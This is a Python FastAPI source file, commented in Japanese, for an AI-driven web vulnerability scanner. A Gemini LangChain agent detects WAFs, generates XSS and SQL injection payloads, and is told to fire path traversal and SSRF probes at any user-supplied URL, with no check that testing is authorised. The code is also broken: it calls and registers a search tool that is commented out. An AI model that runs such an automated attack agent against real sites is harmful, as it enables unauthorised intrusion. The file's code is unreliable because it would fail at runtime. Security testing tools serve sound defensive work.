import os
import uvicorn
from fastapi import FastAPI, APIRouter, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field
from dotenv import load_dotenv
from typing import Optional, List, Dict
import asyncio
import httpx
import re
from bs4 import BeautifulSoup
import random
import string
import time

from langchain_google_genai import ChatGoogleGenerativeAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_core.tools import tool
from langchain.memory import ConversationBufferMemory
# from langchain_community.utilities import GoogleSearchAPIWrapper

# --- FastAPIとAPIRouterのインスタンスを生成 ---
load_dotenv()
app = FastAPI()
router = APIRouter()

'''
@tool
def google_search_for_cve(query: str) -> List[dict]:
    """
    指定されたクエリでGoogle検索を実行するが、現在はダミー機能。
    """
    print(f"Executing DUMMY Google Search for query: {query}")
    # 簡略化のためにダミーの結果を返します
    dummy_results = [
        {"title": "CVE-2023-1234 WordPress Plugin XSS", "url": "https://example.com/cve", "snippet": "A reflected XSS vulnerability was found in a WordPress plugin."},
        {"title": "How to fix Apache 2.4.46 vulnerability", "url": "https://example.com/fix", "snippet": "A guide to patching critical vulnerabilities in Apache."},
    ]
    return dummy_results
'''
# --- 脆弱性ペイロード生成関数 (変更なし) ---
def generate_xss_payloads(num_payloads: int = 5) -> List[str]:
    base_payloads = ["<script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>","javascript:alert('XSS');","';alert('XSS');//","<body onload='alert(\"XSS\")'>","<iframe src='javascript:alert(\"XSS\")'></iframe>","<a href='javascript:alert(\"XSS\")'>click</a>"]
    encoded_payloads = []
    for payload in base_payloads:
        if random.random() < 0.3:
            encoded_payloads.append(payload.encode('utf-8').hex())
            encoded_payloads.append("&#" + ";&#".join([str(ord(c)) for c in payload]))
    random_payloads = []
    for _ in range(num_payloads):
        random_chars = ''.join(random.choices(string.ascii_letters + string.digits + "'\"`()", k=random.randint(5, 15)))
        payload = f"<script>alert('{random_chars}')</script>"
        random_payloads.append(payload)
    return base_payloads + encoded_payloads + random_payloads
def generate_sqli_payloads(num_payloads: int = 5) -> List[str]:
    base_payloads = ["' OR 1=1--","' UNION SELECT NULL, NULL, NULL--","' OR '1'='1'#","admin' --","admin' #","sleep(5)","benchmark(10000000,MD5(1))"]
    blind_payloads = ["' AND 1=1--","' AND 1=2--","' OR 1=1--","' OR 1=2--","') AND ('1'='1'--","') AND ('1'='2'--"]
    random_payloads = []
    for _ in range(num_payloads):
        random_payload = f"'{random.choice(['OR','AND'])} '1'='1'-- {random.randint(1, 1000)}"
        random_payloads.append(random_payload)
    return base_payloads + blind_payloads + random_payloads

# --- ツール定義 ---
@tool
async def search_cve_by_tech_stack(tech_stack: List[Dict]) -> str:
    """
    指定された技術スタック名とバージョンに関連するCVE情報をGoogle Searchで検索する。
    """
    cve_results = []
    
    for item in tech_stack:
        name = item.get('name')
        version = item.get('version')
        if name:
            query = f"{name} {version} CVE" if version else f"{name} CVE"
            
            try:
                # --- 修正: ダミーの検索ツールを直接呼び出す ---
                search_results = google_search_for_cve.invoke(input={"query": query})
                result_text = ""

                if search_results:
                    for res in search_results:
                        result_text += f"Title: {res.get('title')}\nURL: {res.get('url')}\nSnippet: {res.get('snippet')}\n\n"
                else:
                    result_text = f"No search results found for {name}."
                cve_results.append(f"--- CVE Search for {name} ({version}) ---\n{result_text}")
            except Exception as e:
                cve_results.append(f"CVE search failed for {name}: {e}")
    
    return "\n".join(cve_results)

@tool
async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
    # (この関数の内容は変更なし)
    async with httpx.AsyncClient() as client:
        try:
            normal_response = await client.request(method, url, timeout=15)
            
            start_time = time.time()
            response = await client.request(method, url, data=data, headers=headers, timeout=15)
            elapsed_time = time.time() - start_time
            
            vulnerability_flags = []
            
            if payload_type == "sqli":
                sql_error_patterns = [r"sql syntax", r"mysql", r"query error", r"unclosed quotation", r"driver error", r"postgis error", r"pg_error", r"ora-[0-9]+"]
                if response.status_code == 500 or any(re.search(p, response.text, re.IGNORECASE) for p in sql_error_patterns):
                    vulnerability_flags.append("SQLI_ERROR_DETECTED")
                if data and ("' AND 1=1--" in data or "' OR 1=1--" in data):
                    response_diff = abs(len(response.text) - len(normal_response.text))
                    if response_diff < 100:
                        vulnerability_flags.append("SQLI_BOOLEAN_BASED_DETECTED")
                if "sleep" in str(data) and elapsed_time > 4:
                    vulnerability_flags.append("SQLI_TIME_BASED_DETECTED")
            
            if payload_type == "xss":
                if data and str(data) in response.text:
                    vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")
                if re.search(r"var\s+\w+\s*=\s*['\"]" + re.escape(str(data)) + r"['\"]", response.text) or re.search(r"document\.write\s*\(\s*['\"]" + re.escape(str(data)) + r"['\"]", response.text):
                    vulnerability_flags.append("XSS_DOM_BASED_DETECTED")
                if re.search(r"<img[^>]*onerror=|javascript:", response.text, re.IGNORECASE):
                    vulnerability_flags.append("XSS_EVENT_HANDLER_DETECTED")

            if payload_type == "path_traversal":
                if re.search(r"root:[xX]:0:0:|c:\\windows|etc/passwd|/etc/passwd", response.text, re.IGNORECASE):
                    vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")

            if payload_type == "ssrf":
                if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
                    vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")

            flags_str = " | ".join(vulnerability_flags) if vulnerability_flags else "No specific vulnerability pattern detected."
            
            if 'text/html' in response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                text_content = soup.get_text(separator=' ', strip=True)
                return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body (Text): {text_content[:500]}"
            
            return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body: {response.text[:500]}"
            
        except httpx.RequestError as e:
            raise HTTPException(status_code=500, detail=f"Request Error: {e}")

@tool
async def detect_waf(url: str) -> str:
    # (この関数の内容は変更なし)
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=10)
            waf_indicators = {"Cloudflare": "cloudflare", "Sucuri": "sucuri", "AWS WAF": "awselb", "Imperva": "imperva", "Akamai": "akamai", "Wordfence": "wordfence"}
            for indicator, name in waf_indicators.items():
                if name in response.headers.get('Server', '').lower() or name in response.text.lower():
                    return f"WAF detected: {indicator}"
            return "No known WAF detected."
    except httpx.RequestError as e:
        raise HTTPException(status_code=500, detail=f"WAF detection error: {e}")


# --- Pydantic モデル定義 (変更なし) ---
class TechStackItem(BaseModel):
    name: str = Field(..., description="技術スタックの名前 (例: 'PHP', 'WordPress')")
    version: Optional[str] = Field(None, description="バージョン情報")
class ScanInput(BaseModel):
    url: str = Field(..., description="スキャン対象のベースURL")
    target_endpoint: str = Field(..., description="脆弱性をテストするエンドポイント (例: '/search.php')")
    tech_stack: List[TechStackItem] = Field(..., description="ターゲットの技術スタック情報")
    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf"], description="診断する脆弱性タイプ")

# --- APIエンドポイント (変更なし) ---
@router.post("/start_scan")
async def start_scan(scan_input: ScanInput):
    llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
    
    # --- 修正: `Google Search_for_cve`ツールのみリストに含める ---
    tools = [
        send_http_request_with_payload, 
        detect_waf, 
        search_cve_by_tech_stack, 
        google_search_for_cve
    ]
    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)
    
    agent_prompt = ChatPromptTemplate.from_messages([
        ("system", "あなたはバグバウンティの専門家であり、高度なウェブ脆弱性スキャナーです。"),
        ("system", "ユーザーが提供する情報に基づき、段階的に脆弱性を検証してください。"),
        ("system", "あなたの思考プロセスは以下のステップに従います: 1. `detect_waf`ツールでWAFの有無を調べる。2. `search_cve_by_tech_stack`ツールを呼び出し、技術スタックに関連するCVEを検索する。3. その結果と技術スタックに基づいて、最適な攻撃ペイロードを生成する。4. `send_http_request_with_payload`ツールでペイロードを試行する。5. 応答に含まれる**Flags**とレスポンス内容を分析し、脆弱性候補を判断する。6. 複数のペイロードでテストを繰り返す。7. 脆弱性が確認できたら、詳細な報告書を生成する。"),
        ("system", "攻撃ペイロードの生成、応答の分析、報告書の作成はすべてあなたの思考プロセスで行い、必要に応じて適切なツールを呼び出してください。"),
        ("system", "特に、Path Traversalではペイロードとして`../`や`..\\`などを、SSRFでは`http://127.0.0.1`や`http://10.0.0.1`などを試行し、`Flags`の出力を注意深く観察してください。"),
        MessagesPlaceholder("chat_history"),
        ("human", "{input}"),
        MessagesPlaceholder("agent_scratchpad"),
    ])
    
    agent = create_tool_calling_agent(llm, tools, agent_prompt)
    agent_executor = AgentExecutor(
        agent=agent,
        tools=tools,
        verbose=True,
        memory=memory
    )
    
    tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in scan_input.tech_stack])
    
    initial_input = f"""
    ターゲットURL: {scan_input.url}
    攻撃対象エンドポイント: {scan_input.target_endpoint}
    技術スタック: {tech_stack_str}
    診断する脆弱性タイプ: {', '.join(scan_input.vulnerability_types)}
    上記情報に基づき、脆弱性スキャンを開始してください。
    """
    
    try:
        result = await agent_executor.ainvoke({"input": initial_input})
        final_report = result.get('output', '診断中に予期せぬエラーが発生しました。')
        return {"status": "scanning_complete", "final_report": final_report}
    except Exception as e:
        return {"status": "error", "final_report": f"診断中にエラーが発生しました: {e}"}

# --- ヘルスチェックとフロントエンド (変更なし) ---
@app.get("/health")
async def health_check():
    return {"status": "ok"}
@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    html_content = """
    <!DOCTYPE html><html><head><title>脆弱性スキャナー</title><style>body { font-family: sans-serif; margin: 2em; } input, button { padding: 0.5em; margin-top: 0.5em; } #output { margin-top: 1em; padding: 1em; border: 1px solid #ccc; background-color: #f9f9f9; white-space: pre-wrap; word-wrap: break-word; }</style></head><body><h1>脆弱性スキャン</h1><p>ターゲット情報を入力してスキャンを開始してください。</p><hr><label for="url">ベースURL:</label><br><input type="text" id="url" value="http://localhost:8000" size="50"><br><label for="endpoint">攻撃対象エンドポイント:</label><br><input type="text" id="endpoint" value="/search" size="50"><br><label for="tech_stack">技術スタック (カンマ区切り):</label><br><input type="text" id="tech_stack" value="WordPress 5.8, Apache 2.4.46" size="50"><br><button onclick="startScan()">スキャン開始</button><div id="output"></div><script>async function startScan() { const url = document.getElementById('url').value; const endpoint = document.getElementById('endpoint').value; const techStackInput = document.getElementById('tech_stack').value; const outputDiv = document.getElementById('output'); outputDiv.textContent = 'スキャンを開始しています...'; const techStackArray = techStackInput.split(',').map(item => { const parts = item.trim().split(' '); const name = parts.shift(); const version = parts.join(' ') || null; return { name: name, version: version }; }); const scanData = { url: url, target_endpoint: endpoint, tech_stack: techStackArray, vulnerability_types: ["xss", "sql_injection", "path_traversal", "ssrf"] }; try { const response = await fetch('/start_scan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(scanData) }); const result = await response.json(); if (response.ok) { outputDiv.textContent = 'スキャン完了\\n\\n' + result.final_report; } else { outputDiv.textContent = 'エラー: ' + (result.detail || JSON.stringify(result)); } } catch (error) { outputDiv.textContent = 'ネットワークエラー: ' + error.message; } }</script></body></html>
    """
    return HTMLResponse(content=html_content)

# --- FastAPI ルーティング (変更なし) ---
app.include_router(router)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
